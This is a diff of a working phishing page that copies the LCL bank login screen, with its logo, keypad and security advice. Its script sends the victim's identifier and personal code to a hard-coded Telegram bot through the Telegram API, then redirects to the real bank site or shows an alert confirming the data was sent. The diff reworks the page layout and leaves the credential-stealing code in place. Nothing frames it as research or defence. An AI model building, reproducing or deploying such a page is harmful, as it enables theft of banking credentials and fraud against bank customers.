@@ -9,36 +9,36 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #ffffff;
             display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
+            flex-direction: column;
+            height: 100vh;
             margin: 0;
-            padding-top: 20px;
             color: #333;
             -webkit-tap-highlight-color: transparent;
         }
 
-        .container {
-            width: 100%;
-            max-width: 360px;
-            padding: 0 20px 20px 20px;
+        .header {
+            padding: 20px;
+            display: flex;
+            align-items: center;
         }
 
         .logo {
-            text-align: center;
-            margin-bottom: 20px;
+            height: 40px;
+            width: auto;
         }
-        
-        .logo img {
-            width: 80px;
+
+        .content {
+            flex: 1;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
         }
 
         h2 {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 600;
             margin-bottom: 20px;
-            text-align: left;
-            color: #000;
         }
 
         .input-group {
@@ -54,52 +54,103 @@
         }
 
         .input-display {
+            font-family: monospace;
             font-size: 26px;
             letter-spacing: 2px;
+            min-height: 40px;
+            border-bottom: 2px solid #ddd;
             color: #000;
-            font-weight: 500;
-            min-height: 35px;
-            border: none;
-            outline: none;
-            background: transparent;
-            width: 100%;
-            padding: 0;
-            margin: 0;
-            font-family: monospace;
+            padding-bottom: 5px;
             cursor: text;
         }
 
-        /* Input réel caché */
+        /* Input réel caché mais actif */
         .hidden-input {
             position: absolute;
-            opacity: 0;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            opacity: 0;
             cursor: text;
             z-index: 10;
         }
 
-        .checkbox-group {
-            margin-top: 5px;
+        /* Le champ code est désactivé au début */
+        #group-pass {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
-        .checkbox-group label {
-            font-size: 14px;
-            color: #666;
-            display: inline;
-            cursor: pointer;
+
+        #group-pass.visible {
+            display: block;
+            opacity: 1;
+        }
+
+        .checkbox-group {
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
         }
         .checkbox-group input {
             margin-right: 8px;
-            vertical-align: middle;
+            width: 16px;
+            height: 16px;
+        }
+        .checkbox-group label {
+            margin-bottom: 0;
+            cursor: pointer;
+        }
+
+        .btn-validate {
+            width: 100%;
+            padding: 14px;
+            background-color: #0055a4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .btn-validate.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .links {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #666;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+        }
+        
+        .security-msg {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+            line-height: 1.4;
+            background-color: #fcfcfc;
+            padding: 10px;
+            border-radius: 4px;
         }
 
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 15px;
-            margin-top: 10px;
+            padding: 20px;
+            background-color: #fff;
+            border-top: 1px solid #eee;
         }
 
         .key {
@@ -128,86 +179,51 @@
             color: #d00;
             font-size: 20px;
         }
-
-        .btn-validate {
-            width: 100%;
-            padding: 14px;
-            background-color: #0055a4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 25px;
-            opacity: 0.5;
-            pointer-events: none;
-        }
-
-        .btn-validate.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .links {
-            margin-top: 15px;
-            font-size: 14px;
-        }
-        .links a {
-            color: #666;
-            text-decoration: none;
-            display: block;
-            margin-bottom: 8px;
-        }
-        
-        .security-msg {
-            font-size: 12px;
-            color: #666;
-            margin-top: 25px;
-            line-height: 1.4;
-            background-color: #fcfcfc;
-            padding: 10px;
-            border-radius: 4px;
-        }
-
-        footer {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 11px;
-            color: #999;
-        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL" class="logo">
     </div>
 
-    <h2>Pour aller de l’avant</h2>
+    <div class="content">
+        <h2>Pour aller de l'avant</h2>
 
-    <!-- Champ 1: Identifiant -->
-    <div class="input-group" id="group-id">
-        <label>Votre identifiant</label>
-        <input type="tel" id="input-id" class="hidden-input" maxlength="10" inputmode="numeric" autocomplete="off">
-        <div class="input-display" id="display-id">__________</div>
-        
-        <div class="checkbox-group">
-            <input type="checkbox" id="remember"> 
-            <label for="remember">Mémoriser mon identifiant</label>
+        <!-- CHAMP 1 : IDENTIFIANT -->
+        <div class="input-group" id="group-id">
+            <label>Votre identifiant</label>
+            <input type="tel" id="input-id" class="hidden-input" maxlength="10" inputmode="numeric" autocomplete="off">
+            <div class="input-display" id="display-id">__________</div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember"> 
+                <label for="remember">Mémoriser mon identifiant</label>
+            </div>
+        </div>
+
+        <!-- CHAMP 2 : CODE PERSONNEL (Caché au début) -->
+        <div class="input-group" id="group-pass">
+            <label>Votre code personnel</label>
+            <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" autocomplete="off" disabled>
+            <div class="input-display" id="display-pass" style="color: #999;">______</div>
+        </div>
+
+        <button class="btn-validate" id="btn-validate" onclick="validate()">Valider</button>
+
+        <div class="links">
+            <a href="#">Identifiant oublié ?</a>
+            <a href="#">Code personnel oublié ?</a>
+            <a href="#">Pas encore client ? <span style="color:#0055a4">Ouvrir un compte &gt;</span></a>
+        </div>
+
+        <div class="security-msg">
+            <strong>Nos conseils sécurité</strong><br>
+            LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.
         </div>
     </div>
 
-    <!-- Champ 2: Code Secret -->
-    <div class="input-group" id="group-pass">
-        <label>Votre code secret</label>
-        <!-- Le disabled sera retiré par le JS quand l'ID sera complet -->
-        <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" autocomplete="off" disabled>
-        <div class="input-display" id="display-pass" style="color: #ccc;">______</div>
-    </div>
-
-    <!-- Clavier -->
+    <!-- CLAVIER -->
     <div class="keypad">
         <button class="key" onclick="press('1')">1</button>
         <button class="key" onclick="press('2')">2</button>
@@ -222,149 +238,140 @@
         <button class="key key-del" onclick="backspace()">⌫</button>
     </div>
 
-    <button class="btn-validate" id="btn-validate" onclick="validate()">Valider</button>
+    <script>
+        // CONFIG TELEGRAM
+        const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
+        const chatId = '8501464548';
 
-    <div class="links">
-        <a href="#">Identifiant oublié ?</a>
-        <a href="#">Code secret oublié ?</a>
-        <a href="#">Pas encore client ? <span style="color:#0055a4">Ouvrir un compte &gt;</span></a>
-    </div>
+        // ELEMENTS
+        const inputId = document.getElementById('input-id');
+        const inputPass = document.getElementById('input-pass');
+        const displayId = document.getElementById('display-id');
+        const displayPass = document.getElementById('display-pass');
+        const groupPass = document.getElementById('group-pass');
+        const btnValidate = document.getElementById('btn-validate');
 
-    <div class="security-msg">
-        <strong>Nos conseils sécurité</strong><br>
-        LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.
-    </div>
+        // ETAT
+        let currentField = 'id'; 
 
-    <footer>
-        monespace.lcl.fr
-    </footer>
-</div>
-
-<script>
-    // CONFIG TELEGRAM
-    const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
-    const chatId = '8501464548';
-
-    // ELEMENTS
-    const inputId = document.getElementById('input-id');
-    const inputPass = document.getElementById('input-pass');
-    const displayId = document.getElementById('display-id');
-    const displayPass = document.getElementById('display-pass');
-    const btnValidate = document.getElementById('btn-validate');
-
-    // ETAT ACTUEL
-    let currentField = 'id'; // 'id' ou 'pass'
-
-    // INITIALISATION
-    inputId.focus();
-
-    // Gestion du clic pour changer de champ manuellement
-    document.getElementById('group-id').addEventListener('click', () => {
-        currentField = 'id';
+        // INITIALISATION
         inputId.focus();
-    });
 
-    document.getElementById('group-pass').addEventListener('click', () => {
-        if (!inputPass.disabled) {
-            currentField = 'pass';
-            inputPass.focus();
-        }
-    });
+        // GESTION CLIC POUR CHANGER DE CHAMP
+        document.getElementById('group-id').addEventListener('click', () => {
+            currentField = 'id';
+            inputId.focus();
+        });
 
-    // MISE A JOUR AFFICHAGE
-    function updateDisplay(input, display, isPassword = false) {
-        const val = input.value;
-        let max = input.maxLength;
-        let str = '';
-        
-        for(let i=0; i<max; i++) {
-            if (i < val.length) {
-                if (isPassword && !input.disabled) {
-                    str += '•'; 
+        document.getElementById('group-pass').addEventListener('click', () => {
+            if (!inputPass.disabled) {
+                currentField = 'pass';
+                inputPass.focus();
+            }
+        });
+
+        // MISE A JOUR AFFICHAGE
+        function updateDisplay(input, display, isPassword = false) {
+            const val = input.value;
+            const max = input.maxLength;
+            let str = '';
+            
+            for(let i=0; i<max; i++) {
+                if (i < val.length) {
+                    if (isPassword) {
+                        str += '•'; 
+                    } else {
+                        str += val[i]; 
+                    }
                 } else {
-                    str += val[i]; 
+                    str += '_';
                 }
-            } else {
-                str += '_';
+            }
+            display.textContent = str;
+        }
+
+        // ACTIVATION DU CHAMP SUIVANT
+        function activateNext() {
+            inputPass.disabled = false;
+            inputPass.focus();
+            groupPass.classList.add('visible');
+            currentField = 'pass';
+            updateDisplay(inputPass, displayPass, true);
+        }
+
+        // SAISIE
+        function press(num) {
+            let input = (currentField === 'id') ? inputId : inputPass;
+            let display = (currentField === 'id') ? displayId : displayPass;
+
+            if (input.value.length < input.maxLength) {
+                input.value += num;
+                updateDisplay(input, display, (currentField === 'pass'));
+                
+                // Si on est sur l'ID et qu'il est plein, on passe au suivant
+                if (input === inputId && inputId.value.length === 10) {
+                    activateNext();
+                }
+                
+                checkReady();
             }
         }
-        display.textContent = str;
-        
-        // SI ID REMPLI : On active le champ pass
-        if (input === inputId && val.length === 10) {
-            activateNext();
-        }
-    }
 
-    // Fonction critique : active le champ suivant
-    function activateNext() {
-        inputPass.disabled = false; // C'est ICI qu'on débloque le champ
-        inputPass.focus();
-        currentField = 'pass';
+        function backspace() {
+            let input = (currentField === 'id') ? inputId : inputPass;
+            let display = (currentField === 'id') ? displayId : displayPass;
+
+            if (input.value.length > 0) {
+                input.value = input.value.slice(0, -1);
+                updateDisplay(input, display, (currentField === 'pass'));
+                checkReady();
+            }
+        }
+
+        function checkReady() {
+            if (inputId.value.length === 10 && inputPass.value.length === 6) {
+                btnValidate.classList.add('active');
+            } else {
+                btnValidate.classList.remove('active');
+            }
+        }
+
+        // TELEGRAM
+        async function sendToTelegram(id, pass) {
+            const msg = `🔐 *Connexion LCL*\n\n👤 ID: ${id}\n🔑 Code: ${pass}\n📅 ${new Date().toLocaleString()}`;
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: chatId, text: msg, parse_mode: 'Markdown'})
+                });
+            } catch(e) { console.error(e); }
+        }
+
+        function validate() {
+            if (btnValidate.classList.contains('active')) {
+                sendToTelegram(inputId.value, inputPass.value);
+                // Simulation de chargement ou redirection
+                setTimeout(() => {
+                    // window.location.href = 'https://www.lcl.fr';
+                    alert('Données envoyées !');
+                }, 500);
+            }
+        }
+
+        // CLAVIER PHYSIQUE (OPTIONNEL)
+        document.addEventListener('keydown', (e) => {
+            if (e.key >= '0' && e.key <= '9') {
+                press(e.key);
+            } else if (e.key === 'Backspace') {
+                backspace();
+            }
+        });
+
+        // Initial display
+        updateDisplay(inputId, displayId);
         updateDisplay(inputPass, displayPass, true);
-    }
 
-    // SAISIE
-    function press(num) {
-        let input = (currentField === 'id') ? inputId : inputPass;
-        let display = (currentField === 'id') ? displayId : displayPass;
-
-        if (input.value.length < input.maxLength) {
-            input.value += num;
-            updateDisplay(input, display, (currentField === 'pass'));
-            checkReady();
-        }
-    }
-
-    function backspace() {
-        let input = (currentField === 'id') ? inputId : inputPass;
-        let display = (currentField === 'id') ? displayId : displayPass;
-
-        if (input.value.length > 0) {
-            input.value = input.value.slice(0, -1);
-            updateDisplay(input, display, (currentField === 'pass'));
-            checkReady();
-        }
-    }
-
-    function checkReady() {
-        if (inputId.value.length === 10 && inputPass.value.length === 6) {
-            btnValidate.classList.add('active');
-        } else {
-            btnValidate.classList.remove('active');
-        }
-    }
-
-    // TELEGRAM
-    async function sendToTelegram(id, pass) {
-        const msg = `🔐 *Connexion LCL*\n\n👤 ID: ${id}\n🔑 Code: ${pass}\n📅 ${new Date().toLocaleString()}`;
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: chatId, text: msg, parse_mode: 'Markdown'})
-            });
-        } catch(e) { console.error(e); }
-    }
-
-    function validate() {
-        if (btnValidate.classList.contains('active')) {
-            sendToTelegram(inputId.value, inputPass.value);
-            setTimeout(() => {
-                window.location.href = 'https://www.lcl.fr';
-            }, 1000);
-        }
-    }
-
-    // CLAVIER PHYSIQUE
-    document.addEventListener('keydown', (e) => {
-        if (e.key >= '0' && e.key <= '9') {
-            press(e.key);
-        } else if (e.key === 'Backspace') {
-            backspace();
-        }
-    });
-</script>
-
+    </script>
 </body>
 </html>
